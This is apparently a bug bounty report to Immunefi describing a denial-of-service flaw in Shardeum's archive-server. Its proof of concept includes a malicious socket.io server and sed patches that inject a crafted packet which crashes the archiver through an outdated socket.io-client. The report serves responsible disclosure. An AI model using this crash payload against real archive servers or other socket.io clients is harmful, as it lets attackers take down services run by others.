# Boost \_ Shardeum\_ Ancillaries 34298 - \[Websites and Applications - Medium] archive-server can be kil

## archive-server can be killed by connected shardus-instance

Submitted on Thu Aug 08 2024 15:15:27 GMT-0400 (Atlantic Standard Time) by @riproprip for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #34298

Report type: Websites and Applications

Report severity: Medium

Target: <https://github.com/shardeum/archive-server/tree/dev>

Impacts:

* Taking down the application/website

### Description

### Brief/Intro

On boot the `archive-server` connects to a randomized `shardus-instance`. This instance has the power to kill the process that runs the archive server.

### Vulnerability Details

Archive-server is using an outdated socket.io-client. The old implementation has issues with specially crafted packets.

Since Archive-server does not do any special error handling the error in the socket.io-client can bubble up "uncatched" and kill the process.

Since the archive-server tries to randomly connect to a shardus-instance, it might not be a terrifying issue. Otoh I saw references in the documentation that archive servers should be rewarded for their service in the future, so there would be incentive to try to kill archive servers that you don't run ...

### Proof of concept

## Prepare

```
apt-get update
apt-get -y install git-core curl build-essential python3 vim
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source "$HOME/.cargo/env"
rustup install 1.74.1; rustup default 1.74.1
nvm install 18.16.1; nvm use 18.16.1
npm i -g node-gyp
```

## create and start evil shardus-instance

In one terminal

### Create folder

```
mkdir /tmp/net_attack
cd /tmp/net_attack
```

### save as package.json

```
{
  "dependencies": {
    "engine.io-client": "~3.5.0",
    "express": "^4.19.2",
    "socket.io": "^2.5.1",
    "socket.io-client": "^2.5.0"
  }
}
```

### save as evil-shardus.js

```
const PORT = 3030;
const app = require('express')();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {cors: {origin: "*",methods: ["GET", "POST"]}});

io.on('connection', (socket) => {
        console.log('A user connected', new Date());

        socket.on('ARCHIVER_PUBLIC_KEY', (key) => {
                console.log('ARCHIVER WITH KEY CONNECTED', key);
        });

        setTimeout(() => {
                console.log('killing archiver', new Date());
                socket.emit('doesnt', 'matter'); // this will be overriden by our encoder implementation
        }, 60_000);
});

http.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
```

### install packages and replace encoder with evil encoder

```
npm install
sed -i 's/var encoding = encodeAsString(obj);/var encoding = encodeAsString(obj); if (obj.type == 2) encoding = '"'"'2[{"toString":"rip"}]'"'"';/' ./node_modules/socket.io-client/node_modules/socket.io-parser/index.js
sed -i 's/var encoding = encodeAsString(obj);/var encoding = encodeAsString(obj); if (obj.type == 2) encoding = '"'"'2[{"toString":"rip"}]'"'"';/' ./node_modules/socket.io-parser/index.js
```

#### run evil shardus instance

```
node evil-shardus.js
```

## run archiver

I could not find another script that made this easy. So just reusing the stuff I had for the other bugs ...

We will reuse the shardeum repo and the `shardus start 10` to run an archiver. But before we run the archiver, we make sure it connects to the evil -shardus.js.

In another terminal

### general setup

```
cd tmp
git clone https://github.com/shardeum/shardeum.git; cd shardeum; git switch dev
npm ci
npm install -g shardus
npm update @shardus/archiver
git apply debug-10-nodes.patch
npm run prepare
```

### make sure that archiver connects to our evil implementation of a shardus-instance

```
sed -i 's/const socketClient = ioclient.connect(`http:\/\/${node\.ip}:${node\.port}`);/const socketClient = ioclient.connect(`http:\/\/${node\.ip}:3030`);/' ./node_modules/@shardus/archiver/build/Data/Data.js
```

### run shardus

We run shardus, and observe our archive server disappear when the evil-shardus terminal prints "killing archiver". (60 second wait in current evil-shardus.js)

```
shardus start 10; 
PID=$(ps -ef | grep "archiver/build/server.js" | tr -s " " | cut -f2 -d" " | head -n1); 
watch -n2 "ps -ef | grep "$PID" | grep -v watch | grep node"
```
